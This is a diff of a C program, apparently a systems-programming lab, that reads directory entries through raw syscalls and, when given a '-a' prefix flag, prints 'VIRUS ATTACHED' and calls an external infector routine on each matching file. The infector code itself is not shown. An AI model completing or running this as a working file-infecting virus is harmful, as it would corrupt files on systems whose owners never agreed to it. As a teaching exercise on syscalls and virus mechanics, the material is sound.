@@ -1,49 +1,79 @@
 #include "util.h"
 
-#define SYS_OPEN 5
-#define SYS_WRITE 4
 #define SYS_GETDENTS 141
+#define SYS_WRITE 4
 #define STDOUT 1
+#define BUF_SIZE 8192
 
-extern void infection();
-extern void infector(char* filename);
-extern int system_call(int, int, int, int);
-
+/* Simplified dirent structure for getdents */
 struct linux_dirent {
     unsigned long  d_ino;
     unsigned long  d_off;
     unsigned short d_reclen;
-    char           d_name[];
+    char           d_name[1];
 };
 
-int main (int argc , char* argv[], char* envp[]) {
-    char buf[8192];
-    int fd, nread, bpos;
+/* External function prototypes */
+extern int system_call(int, ...);
+extern void infection();
+extern void infector(char *);
+
+void print(char* message) {
+    system_call(SYS_WRITE, STDOUT, message, strlen(message));
+}
+
+int main(int argc, char *argv[]) {
+    int fd, nread, i, bpos;
+    char buf[BUF_SIZE];
     struct linux_dirent *d;
     char *prefix = 0;
-
-    for(int i=1; i<argc; i++) {
-        if(strncmp(argv[i], "-a", 2) == 0) prefix = argv[i] + 2;
-    }
-
-    fd = system_call(SYS_OPEN, (int)".", 0, 0);
-    if(fd < 0) system_call(1, 0x55, 0, 0);
-
-    nread = system_call(SYS_GETDENTS, fd, (int)buf, 8192);
+    int attach_mode = 0;
+    char *file_or_directory_name;
     
-    for (bpos = 0; bpos < nread;) {
+    /* Parse arguments */
+    for (i = 1; i < argc; i++) {
+        if (strlen(argv[i]) >= 2 && argv[i][0] == '-' && argv[i][1] == 'a') {
+            attach_mode = 1;
+            prefix = argv[i] + 2;
+        }
+    }
+    
+    /* Open current directory "." */
+    fd = system_call(5, ".", 0, 0); 
+    if (fd < 0) {
+        system_call(1, 0x55, 0, 0); /* TODO - change this to goto lblCleanup. */ 
+    }
+    /* Get directory entries */
+    nread = system_call(SYS_GETDENTS, fd, buf, BUF_SIZE);
+    if (nread <= 0) {
+        print("Error in getdents\n");
+        system_call(1, 0x55, 0, 0);
+    }
+    
+    /* Iterate through entries */
+    bpos = 0;
+    while (bpos < nread) {
         d = (struct linux_dirent *) (buf + bpos);
-        
-        if (!prefix || (prefix[0] == d->d_name[0])) {
-            system_call(SYS_WRITE, STDOUT, (int)d->d_name, strlen(d->d_name));
-            if (prefix && prefix[0] == d->d_name[0]) {
-                system_call(SYS_WRITE, STDOUT, (int)" VIRUS ATTACHED", 15);
-                infection();
-                infector(d->d_name);
+        file_or_directory_name = d->d_name;
+
+        /* Skip "." and ".." to avoid accidental recursion/infection */
+        if (strcmp(file_or_directory_name, ".") != 0 && strcmp(file_or_directory_name, "..") != 0) {
+            
+            /* If no prefix provided, print all. If prefix provided, filter. */
+            if (!attach_mode || (file_or_directory_name[0] == prefix[0])) {
+                print(file_or_directory_name);
+                
+                if (attach_mode && (file_or_directory_name[0] == prefix[0])) {
+                    print(" VIRUS ATTACHED");
+                    infector(file_or_directory_name);   
+                }
+                
+                print("\n");
             }
-            system_call(SYS_WRITE, STDOUT, (int)"\n", 1);
         }
         bpos += d->d_reclen;
     }
+
+    system_call(6, fd, 0, 0); /* sys_close */
     return 0;
 }
